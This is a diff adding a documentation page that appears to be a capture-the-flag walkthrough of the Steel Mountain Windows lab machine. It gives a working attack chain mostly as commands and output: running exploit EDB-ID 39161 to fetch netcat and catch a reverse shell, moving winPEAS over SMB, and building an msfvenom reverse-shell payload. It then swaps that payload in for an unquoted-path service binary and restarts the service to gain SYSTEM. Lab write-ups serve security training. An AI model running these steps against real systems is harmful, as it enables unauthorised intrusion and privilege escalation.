@@ -1,0 +1,148 @@
+---
+sidebar_position: 3
+---
+
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
+# Manual Exploitation
+
+
+:::caution PYTHON2 Must Be Used To Host The Static NETCAT Binary
+
+:::
+
+
+<br/>
+
+- **Used Exploit** <b style={{ color: 'Red' }}>EDB-ID: 39161</b>
+- `[1]` Hosting a Static `netcat` Binary on <b style={{ color: 'SandyBrown' }}>[LOCAL-IP:80]</b>
+- `[2]` Setting our Machine <span style={{fontWeight: 'Bold'}}>IP - PORT</span>
+- `[3]` Starting a Listener on the <span style={{fontWeight: 'Bold'}}>PORT</span>
+- <b style={{ color: 'Coral' }}>[First Execution]:</b> The Exploit Uploads the <span style={{fontWeight: 'Bold'}}>NETCAT</span> Static Binary to the Remote Machine. 
+- <b style={{ color: 'Coral' }}>[Second Execution]:</b> The Exploit Initializes the Connection Back to our Machine.
+
+
+
+:::info STEPS
+
+<Tabs>
+  <TabItem value="script_ip" label="STEP [1]"> 
+    <span style={{fontWeight: 'Bold'}}> Modify The Exploit Values To Match The Attacker IP
+
+```bash
+ip_addr = "10.10.20.30" #local IP address
+local_port = "443" # Local Port number
+```
+
+</span>
+  </TabItem>
+  <TabItem value="python" label="STEP [2]">
+        <span style={{fontWeight: 'Bold'}}> Use Python2 as the Server. 
+        
+
+The Netcat Binary must be Named: <b style={{ color: 'DeepSkyBlue' }}>nc.exe</b>
+```py
+attacker@machine:~$ python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.32.61 - - [22/Aug/2022 18:00:01] "GET /nc.exe HTTP/1.1" 200 -
+10.10.32.61 - - [22/Aug/2022 18:00:05] "GET /nc.exe HTTP/1.1" 200 -
+```
+
+</span>
+  </TabItem>
+  
+    <TabItem value="python_two" label="STEP [3]">
+        <span style={{fontWeight: 'Bold'}}> Execute the Script. [It May be Necessary to Execute it Multiple Times]
+
+```bash
+attacker@machine:~$ python2 39161.py 10.10.32.61 8080
+```
+
+</span>
+  </TabItem>
+  
+  <TabItem value="netcat" label="STEP [4]">
+    <span style={{fontWeight: 'Bold'}}> Catch the Reverse SHELL with <b style={{ color: 'Coral' }}>netcat</b>
+
+```bash
+attacker@machine:~$  nc -nvlp 443
+Connection from 10.10.32.61:49328
+Microsoft Windows [Version 6.3.9600]
+
+C:\Windows\Temp> whoami
+STEELMOUNTAIN\bill
+```
+
+</span>
+  </TabItem>
+</Tabs>
+
+:::
+
+
+<br/>
+<br/>
+
+- Using a **Simple `SMB` Server** to Transfer files to the **Target Machine.**
+
+```bash
+attacker@machine:~$ mkdir /mnt/SMBShare
+attacker@machine:~$ smbserver LINUXSHARE /mnt/SMBShare
+```
+
+```log
+C:\Windows\Temp> copy \\10.10.20.30\LINUXSHARE\winPEASx64.exe winPEASx64.exe
+        1 file(s) copied.
+```
+
+<br/>
+<br/>
+
+- Enumerating the Machine Using <b style={{ color: 'LightGreen' }}>winPEAS</b>
+- The <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service has <b style={{ color: 'Brown' }}>[Unquoted Service Paths] - [CanRestart = True]</b>
+
+
+```log
+=========================================================================================================================================================================
+AdvancedSystemCareService9(Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\AdvancedSystemCare\ASCService.exe] - Auto - Stopped - No quotes and Space detected
+File Permissions: bill [WriteData/CreateFiles]
+Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteDataCreateFiles])
+Advanced SystemCare Service
+=========================================================================================================================================================================
+```
+
+<br/>
+<br/>
+
+- Generating the **PAYLOAD** with <b style={{ color: 'IndianRed' }}>MSFVenom</b>
+
+```log
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.20.30 LPORT=8888 -f exe -o ASCService.exe
+```
+
+<br/>
+<br/>
+
+- Uploading and Replacing the <span style={{fontWeight: 'Bold'}}>ASCService.exe</span> <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service with a <span style={{fontWeight: 'Bold'}}>Reverse Shell.</span>
+- Restarting the <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service will Start our <span style={{fontWeight: 'Bold'}}>Reverse Shell.</span>
+
+```powershell
+C:\Program Files (x86)\IObit\Advanced SystemCare> sc stop AdvancedSystemCareService9
+C:\Program Files (x86)\IObit\Advanced SystemCare> sc start AdvancedSystemCareService9
+```
+
+<br/>
+
+- **We can catch the Reverse Shell Using `netcat`**
+- We have **System Rights:** <b style={{ color: 'Red' }}>NT AUTHORITY\SYSTEM</b>
+
+```log
+Connection from 10.10.176.77:49227
+Microsoft Windows [Version 6.3.9600]
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+---
